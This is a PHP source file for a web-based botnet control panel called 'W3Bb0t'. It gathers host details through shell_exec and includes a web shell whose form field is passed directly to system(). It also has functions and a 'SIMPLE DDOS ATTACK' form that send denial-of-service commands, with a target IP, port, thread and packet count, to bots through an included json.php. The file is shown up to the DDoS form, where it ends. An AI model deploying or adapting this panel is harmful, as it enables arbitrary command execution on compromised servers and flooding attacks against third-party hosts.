<?php

	//Server Information:
	$server_os = shell_exec("uname -o");
	$server_kernel = shell_exec("uname -r");
	$server_ip = $_SERVER["SERVER_ADDR"];

	$server_current_user = shell_exec("whoami");
	$server_current_path = shell_exec("pwd");

	$page = (isset($_GET['page']))? $_GET['page'] : 1;

	//Mysql Credentials:
	$mysql_host = "";
	$mysql_user = "";
	$mysql_pass = "";

	//Mysql Configuration:
	$mcon = mysql_connect($mysql_host, $mysql_user, $mysql_pass);
	mysql_select_db("w3bbot", $mcon);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<link href="data:image/jpeg;base64,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" rel="icon">
	<title>W3Bb0t - WEB BOTNET</title>

	<style>
		@import url('https://fonts.googleapis.com/css?family=Wallpoet');

		body{
			background-color: black;
		}
		input[type=text]{
		width: 195;
		}
		a{
			text-decoration: none;
		}
		span{
			margin:0 0 0 0;
		}
		table{
				width: 1180px;
				height: auto;
				margin: 10px 0 0 10px;
		}
		th, td{
			text-align: center;
		}
		#main{
			width: 1664px;
			height: 940px;
			margin: auto;
			color: #B11623;
			background-color: #000000;
		}
		#top{
			width: 1664px;
			height: 240px;
			background-image: url("https://hdwallsource.com/img/2014/8/world-map-wallpaper-6236-6424-hd-wallpapers.jpg");
		}
		#mouset{
			float: left;
			margin: 30px 0 0 717px;
			color: #B11623;
			font-size: 70px;
			font-family: 'Wallpoet', cursive;
			font-weight:lighter;
		}
		#mousett{
			float: left;
			margin: 5px 0 0 660px;
			color: #B11623;
			font-size: 35px;
			font-family: 'Wallpoet', cursive;
			font-weight:lighter;
		}
		#mid{
			width: 1664px;
			height: 600px;
			margin:5px 0 0 0;
			color: #9F111B;
			background-color: #000000;
		}
		#sv_info{
			width: 350px;
			height: 580px;
			margin:10px 0 0 0;
			float: left;
			background-color: #1a1a1a;
			color: #9F111B;
			font-size: 15px;
			font-weight:lighter;
		}
		#sv_system{
			margin-left:5px;
			font-size: 18px;
		}
		#sv_tools{
			margin-top:10px;
			margin-left:5px;
			font-size: 15px;
			}
		#comand_bots{
			margin-top:10px;
			margin-left:5px;
			font-size: 15px;
		}
		#info_bots{
			margin-top:10px;
			margin-left:5px;
			font-size: 15px;
		}
		#sub_refresh{
			width: 140px;
			margin:0 0 0 15px;
		}
		#ttitle{
			color: #9F111B;
			margin-top: 5px;
			font-size: 25px;
			font-weight:lighter;
		}
		#main_bots{
			width: 1200px;
			height: 580px;
			margin: 10px 0 0 114px;
			float: left;
			background-color:  #1a1a1a;
		}
		#bots_pages{
			width: 1180px;
			height: auto;
			margin: 10px 0 0 10px;
			color: white;
			background-color: #0d0d0d;
		}
		#font_pages{
			margin-left: 5px;
			}
		#botom{
			width: 1664px;
			height: 100px;
			color: #9F111B;
			background-color: #1a1a1a;
		}
		#bt_image{
			float: left;
			margin:10px 0 0 15px;
		}
		#credit{
			float: left;
			margin: 20px 0 0 20px;
		}
	</style>
</head>

<body>
	<div id="main">
		<div id="top">
			<div id="mouset">W3Bb0t</div>
			<div id="mousett">Created by: Mouse_BL0ck</div>
		</div>

		<div id="mid">
			<div id="sv_info">
				<div id="ttitle" align="center">Server Information</div>
				<hr size=3px color="black" width=580px align=center />
				<div id="sv_system">
					<?php
						echo("Server Ip: ".$server_ip."<br>OS: ".$server_os."<br>Kernel: ".$server_kernel
						."<br>Current User: ".$server_current_user."<br>Current Path: ".$server_current_path."<br>");
					?>
				</div>
				<hr size=3px color="black" width=580px align=center />
				<div id="sv_tools">
					<?php
						if($_POST["cshell"] != ""){
							try{
								system($_POST["cshell"]);
								echo("<br>Command [".$_POST["cshell"]."] Executed.<br><br>");
								}catch(Exception $e){
									echo ("Error [".$e."]<br><br>");}
							}
					?>
					<form method="post" action="" id="fshell">
						Server_Shell <input type="text" name="cshell" autocomplete> <input type="submit" value="Submit" name="subshell">
					</form>
				</div>
				<hr size=3px color="black" width=580px align=center />
				<div id="comand_bots">
					<?php
						//Call json.php fucntions:
						include 'json.php';


						function Scommand_json_ddos(){
							if(isset($_POST['cb_ddos'])){
								$t_ip = split(':', $_POST['cb_ddos'])[0];
								$t_port = (int)split(':', $_POST['cb_ddos'])[1];
								$t_packages = (int)$_POST['cb_ddos_packages'];

								Spend_command("ddos", "Command_Bot.ddos", $t_ip, $t_port, 1, $t_packages);
							}else{
								return false;
							}

						}


						function Scommand_json_Addos(){
							if(isset($_POST['cb_advddos']) and isset($_POST['cb_advddos_threads'])){
								$t_ip = split(':', $_POST['cb_advddos'])[0];
								$t_port = (int)split(':', $_POST['cb_advddos'])[1];
								$t_threads = (int)$_POST['cb_advddos_threads'];
								$t_packages = (int)$_POST['cb_advddos_packages'];


								Spend_command("ddos", "Command_Bot.Addos", $t_ip, $t_port, $t_threads, $t_packages);
							}else{
								return false;
							}

						}


						function Scommand_json_command(){
							$command = null;

							if(isset($command)){
								Spend_command("command", $command);
							}

						}
						// Spend_command('ddos', 'Command_Bot.ddos', split(':', $_POST['cb_ddos'])[0], split(':', $_POST['cb_ddos'])[1], 1);
						// Spend_command('ddos', 'Command_Bot.Addos', split(':', $_POST['cb_advddos'])[0], split(':', $_POST['cb_advddos'])[1], $_POST['cb_advddos_threads']);
						//deixar so um botao de attack e ai se vc preche um form o outro nao e prenchido whatever.
					?>
					<h4>SIMPLE DDOS ATTACK</h4>
					<form method="post" onsubmit="<?php Scommand_json_ddos() ?>" name="cbots_ddos">
						Target <input type="text" name="cb_ddos" placeholder="Ex: 192.168.0.10:80" required><br> Packages <input type="number" name="cb_ddos_packages" required> <input type="submit" value="Attack" name="sub_ddosattack" >
					</form>
					<br>
